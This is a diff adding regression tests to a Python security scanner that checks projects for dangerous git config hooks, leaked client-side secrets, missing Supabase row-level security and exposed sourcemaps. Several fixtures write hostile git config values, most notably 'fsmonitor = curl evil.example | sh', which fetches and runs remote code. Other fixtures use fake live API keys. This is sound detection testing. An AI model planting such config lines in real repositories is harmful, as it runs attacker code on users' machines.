@@ -14,6 +14,7 @@ def write(root: Path, rel: str, content: str) -> None:
     path = root / rel
     path.parent.mkdir(parents=True, exist_ok=True)
     path.write_text(content, encoding="utf-8")
+    vibecheck._READ_CACHE.pop(path, None)  # checks share a per-run read cache; a rewritten fixture must not hit it
 
 
 class SecretCheckTests(unittest.TestCase):
@@ -367,6 +368,141 @@ class TestPathDowngradeTests(unittest.TestCase):
             write(root, "src/__tests__/fixtures/fake.py", 'KEY = "sk_live_' + "a1b2c3d4e5" * 3 + '"')
             findings = {f.check: f for f in vibecheck.run_vibecheck(root)}
             self.assertEqual(findings["secrets"].status, "warn")
+
+
+class ReviewRegressionTests(unittest.TestCase):
+    """One test per confirmed finding from the PR #34 review."""
+
+    def test_git_config_one_line_section_form_and_include(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            write(root, ".git/config", "[core] fsmonitor = curl evil.example | sh\n[include]\n\tpath = ../payload\n")
+            write(root, "payload", "[diff]\n\texternal = /tmp/x\n")
+            finding = vibecheck.check_git_config_exec(root, [])
+            self.assertEqual(finding.status, "fail")
+            self.assertIn("core.fsmonitor", finding.message)
+            self.assertIn("diff.external", finding.message)
+
+    def test_git_config_via_gitdir_pointer_worktree(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            write(root, "main/.git/config", "[core]\n\tfsmonitor = echo pwned\n")
+            write(root, "main/.git/worktrees/wt/commondir", "../..\n")
+            write(root, "wt/.git", "gitdir: ../main/.git/worktrees/wt\n")
+            finding = vibecheck.check_git_config_exec(root / "wt", [])
+            self.assertEqual(finding.status, "fail", finding.message)
+            self.assertIn("fsmonitor", finding.message)
+
+    def test_git_config_benign_tooling_is_ok(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            write(root, ".git/config",
+                  "[core]\n\thooksPath = .husky/_\n\tfsmonitor = true\n\tsshCommand = \"ssh\" -i /tmp/key -o StrictHostKeyChecking=no\n"
+                  "[filter \"lfs\"]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n\trequired = true\n"
+                  "[credential]\n\thelper = osxkeychain\n")
+            self.assertEqual(vibecheck.check_git_config_exec(root, []).status, "ok")
+            write(root, ".git/config", "[core]\n\thooksPath = /tmp/evil-hooks\n")
+            self.assertEqual(vibecheck.check_git_config_exec(root, []).status, "fail")
+
+    def test_downgrade_uses_full_offender_list_not_truncated(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            for i in range(11):
+                write(root, f"src/__tests__/auth_{i:02d}.test.ts", "login()")
+            write(root, "src/zz_routes/auth.ts", "session login signin")
+            files = sorted((root / "src").rglob("*.ts"))
+            finding = vibecheck.check_password_reset(root, files)
+            self.assertEqual(finding.status, "fail")
+            self.assertEqual(len(finding.files), 12)
+            out = vibecheck.downgrade_test_only_findings([finding])[0]
+            self.assertEqual(out.status, "fail", "a real auth file is in the list; must not be downgraded")
+
+    def test_is_test_path_is_conservative(self):
+        yes = ["tests/fixtures/keys.py", "src/__tests__/a.test.ts", "pkg/foo_test.go", "spec/models/user_spec.rb", "src/util.spec.tsx"]
+        no = ["src/app/test/route.ts", "src/app/example/route.ts", "src/mocks/server.ts", ".env.test.local",
+              "examples/demo.py", "src/testing_utils.py", "src/latest.py", "app/test/page.tsx"]
+        for rel in yes:
+            self.assertTrue(vibecheck._is_test_path(rel), rel)
+        for rel in no:
+            self.assertFalse(vibecheck._is_test_path(rel), rel)
+
+    def test_supabase_rls_ignores_non_supabase_projects(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            write(root, "package.json", '{"dependencies": {"redis": "^4", "prisma": "^5"}}')
+            write(root, "src/cache.ts", "import { createClient } from 'redis'; createClient()")
+            write(root, "prisma/migrations/0001_init/migration.sql", 'CREATE TABLE "User" (id int);')
+            self.assertEqual(vibecheck.check_supabase_rls(root, [root / "src/cache.ts"]).status, "skip")
+
+    def test_supabase_rls_schema_comments_and_nested_app(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            write(root, "apps/web/package.json", '{"dependencies": {"@supabase/supabase-js": "^2"}}')
+            write(root, "apps/web/supabase/migrations/001.sql",
+                  "-- create table legacy (id int);\n"
+                  "/* create table ghost (id int); */\n"
+                  "create table analytics.events (id int);\n"
+                  "alter table analytics.events enable row level security;\n"
+                  "create table public.orders (id int);\n")
+            write(root, "apps/web/supabase/functions/node_modules/pkg/schema.sql", "create table vendor_jobs (id int);")
+            write(root, "package.json", '{"dependencies": {"@supabase/supabase-js": "^2"}}')
+            finding = vibecheck.check_supabase_rls(root, [])
+            self.assertEqual(finding.status, "fail")
+            self.assertIn("public.orders", finding.message)
+            for absent in ("legacy", "ghost", "analytics", "vendor_jobs"):
+                self.assertNotIn(absent, finding.message)
+
+    def test_supabase_rls_no_migrations_is_p1_warn(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            write(root, "package.json", '{"dependencies": {"@supabase/ssr": "^0.5"}}')
+            finding = vibecheck.check_supabase_rls(root, [])
+            self.assertEqual((finding.severity, finding.status), ("P1", "warn"))
+
+    def test_dotenv_inline_comment_and_quotes(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            write(root, ".env", f"NEXT_PUBLIC_SUPABASE_KEY={_service_role_jwt()}  # service role\n")
+            self.assertEqual(vibecheck.check_client_bundle_secrets(root, []).status, "fail", "comment must not hide the JWT")
+            fake_key = "sk_live_" + "a1b2c3d4e5" * 3  # assembled at runtime so push protection does not see a key literal
+            write(root, ".env", f"NEXT_PUBLIC_MODE=live # replaced {fake_key}\nNEXT_PUBLIC_X=\"abc\" # note\n")
+            self.assertEqual(vibecheck.check_client_bundle_secrets(root, []).status, "ok", "comment text must not be scanned as a value")
+
+    def test_secretish_name_is_token_based(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            write(root, ".env", "NEXT_PUBLIC_PRIVATE_BETA=true\nVITE_PRIVATE_ROUTES=/admin\nNEXT_PUBLIC_SECRETARY_EMAIL=x@y.z\nREACT_APP_SK_TEST_MODE=1\n")
+            self.assertEqual(vibecheck.check_client_bundle_secrets(root, []).status, "ok")
+            write(root, ".env", f"NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY={_service_role_jwt()}\n")
+            finding = vibecheck.check_client_bundle_secrets(root, [])
+            self.assertEqual(finding.status, "fail")
+            self.assertIn("service_role JWT", finding.message, "value-confirmed label must win over the name label")
+
+    def test_monorepo_env_and_sourcemap_are_found(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            write(root, "apps/web/.env.local", f"NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY={_service_role_jwt()}\n")
+            write(root, "apps/web/next.config.mjs", "export default { productionBrowserSourceMaps: true }")
+            write(root, ".envrc", "export NEXT_PUBLIC_SECRET=direnv-not-bundled\n")
+            write(root, "node_modules/pkg/.env", "NEXT_PUBLIC_SECRET=ignored\n")
+            secrets = vibecheck.check_client_bundle_secrets(root, [])
+            self.assertEqual(secrets.status, "fail")
+            self.assertEqual(secrets.files, ["apps/web/.env.local"])
+            maps = vibecheck.check_sourcemaps(root, [])
+            self.assertEqual(maps.status, "warn")
+            self.assertEqual(maps.files, ["apps/web/next.config.mjs"])
+
+    def test_gather_code_files_prunes_nested_build_dirs_and_includes_mjs(self):
+        from mmu_cli.cli import DEFAULT_SKIP_PATHS, gather_code_files
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            write(root, "apps/web/.next/static/chunk.js", "x")
+            write(root, "apps/web/node_modules/dep/index.js", "x")
+            write(root, "apps/api/venv/lib/site-packages/m.py", "x")
+            write(root, "apps/web/next.config.mjs", "x")
+            write(root, "apps/web/src/index.ts", "x")
+            rels = sorted(p.relative_to(root).as_posix() for p in gather_code_files(root, set(DEFAULT_SKIP_PATHS)))
+            self.assertEqual(rels, ["apps/web/next.config.mjs", "apps/web/src/index.ts"])
 
 
 if __name__ == "__main__":
